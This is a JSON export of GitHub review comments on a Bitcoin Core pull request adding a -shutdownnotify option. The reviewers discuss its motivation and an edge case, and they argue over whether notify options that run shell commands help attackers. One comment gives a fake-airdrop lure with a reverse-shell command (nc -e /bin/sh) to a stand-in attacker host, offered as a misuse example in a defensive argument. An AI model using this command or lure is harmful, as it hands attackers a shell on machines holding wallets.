[
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "I understand the motivation however this option can be misused IMO so not sure about adding it\r\n\r\nI was reading the comments in https://github.com/bitcoin/bitcoin/pull/15367 and I think we should even remove `-startupnotify` because it provides an inbuilt [binder](https://en.wikipedia.org/wiki/File_binder) which can be used to run malware in the background when Bitcoin Core starts.\r\n\r\nObservation: Although we can run almost everything as this option allows shell commands but I was experimenting if its possible to keep Bitcoin Core running and never shutdown. Worked intermittently but nothing interesting.\r\n\r\n```\r\nbitcoind -shutdownnotify=\"bitcoind\"\r\n\r\nbitcoin-cli stop\r\n```\r\n\r\nIf getting notifications on start and shutdown is the goal maybe we should not provide easy option to execute shell commands with it. A file with name `notifications.dat` that saves such notifications should be enough IMO.",
      "created_at" : "2021-10-31T19:08:35Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-955775728",
      "id" : 955775728,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58449_rw",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/955775728/reactions"
      },
      "updated_at" : "2021-10-31T19:08:35Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/955775728",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "Thanks, @prayank23 and @shaavan for the review and pointing out the edge case where a user might supply `\"bitcoind\"` as a shutdown notify bash command. \r\n\r\nA solution for that would be to call `.join()` instead `.detach()` in [here](https://github.com/bitcoin/bitcoin/pull/23395/files#diff-b1e19192258d83199d8adaa5ac31f067af98f63554bfdd679bd8e8073815e69dR183). This will result in bitcoind completing the entire shutdown sequence only after the bash command has finished executing. In the scenario where `\"bitcoind\"` is supplied as the bash command, the second `\"bitcoind\"` will fail as bitcoind is already running. However, this would also mean that all other bash commands would also be performed synchronously. \r\n\r\nOpen to feedback on how we should handle the scenario when a user supplies `\"bitcoind\"` as a shutdown notify bash command.\r\n\r\n> When I tried to use this argument value myself, there was no output whatsoever.\r\n\r\nIf you view `debug.log` you should be able to see if `bitcoind` has successfully restarted by searching for `runCommand error:`",
      "created_at" : "2021-11-01T12:07:31Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956178462",
      "id" : 956178462,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5844_iAe",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956178462/reactions"
      },
      "updated_at" : "2021-11-01T12:15:44Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956178462",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> Open to feedback on how we should handle the scenario when a user supplies \"bitcoind\" as a shutdown notify bash command.\r\n\r\nI think we can avoid this case. It was just an observation which looked interesting initially. If a user wants to experiment and provides such argument he should be able to kill process or reboot system.\r\n\r\nI have issues with an option in Bitcoin Core that triggers any shell command based on start/shutdown. This feature can be helpful for lot of people with malicious intent.",
      "created_at" : "2021-11-01T14:08:28Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956265352",
      "id" : 956265352,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5844_3OI",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956265352/reactions"
      },
      "updated_at" : "2021-11-01T14:08:28Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956265352",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "@prayank23 If an attacker manages to make you invoke `bitcoind` with chosen configuration, you have bigger problems (it means they have filesystem access, can see your wallet files, can give themselves RPC access, ...).",
      "created_at" : "2021-11-01T15:25:56Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956330559",
      "id" : 956330559,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845AHI_",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956330559/reactions"
      },
      "updated_at" : "2021-11-01T15:25:56Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956330559",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Concept ACK",
      "created_at" : "2021-11-01T15:26:45Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956331293",
      "id" : 956331293,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845AHUd",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956331293/reactions"
      },
      "updated_at" : "2021-11-01T15:26:45Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956331293",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> @prayank23 If an attacker manages to make you invoke bitcoind with chosen configuration, you have bigger problems (it means they have filesystem access, can see your wallet files, can give themselves RPC access, ...).\r\n\r\n@sipa Yes victim will have bigger problems depending on the case. Are we helping attackers with this feature? \r\n\r\nExample:\r\n\r\nAttacker: We have a new airdrop where you don't need to share any credentials with us. It will be distributed to all bitcoin holders however they need to restart `bitcoind` so that airdrop server is notified about their wallet and registered for airdrop.\r\n\r\nPlease run:\r\n\r\n```\r\n$ bitcoind -shutdownnotify=\"nc -e /bin/sh airdrop.attacker.org 8080\"\r\n```\r\n\r\nVictim: Restarts core with command shared by attacker\r\n\r\nAttacker: Gets reverse shell\r\n\r\n",
      "created_at" : "2021-11-01T15:53:32Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956353035",
      "id" : 956353035,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845AMoL",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956353035/reactions"
      },
      "updated_at" : "2021-11-01T15:53:32Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956353035",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "@prayank23 This is a known and obvious issue with all `-*notify` options, unrelated to this pull request. It might be best to discuss this in another thread.",
      "created_at" : "2021-11-01T15:58:02Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
      "id" : 956356904,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845ANko",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956356904/reactions"
      },
      "updated_at" : "2021-11-01T15:58:02Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956356904",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> Motivation: This will allow users to notify themselves when bitcoind unexpectedly shuts down.\r\n\r\nCan you explain this a bit more? The current code will notify users after Bitcoin Core *expectedly* shuts down, that is, after telling it to shutdown.\r\n\r\nIf users want to find out if it *unexpectedly* shut down, they will need to check for the absence of the notification and verify that the process is not running (e.g. writing state (utxo, wallet, ...) to the disk on shutdown).",
      "created_at" : "2021-11-01T16:13:23Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956371525",
      "id" : 956371525,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845ARJF",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956371525/reactions"
      },
      "updated_at" : "2021-11-01T16:13:40Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956371525",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "There is probably a difference still between *unexpected* shutdowns and *unclean* shutdowns. E.g. when disk is full, Bitcoin Core will (possibly) shut down cleanly, but it's not explicitly requested by the user.",
      "created_at" : "2021-11-01T16:15:25Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956373412",
      "id" : 956373412,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845ARmk",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956373412/reactions"
      },
      "updated_at" : "2021-11-01T16:15:25Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956373412",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   }
]
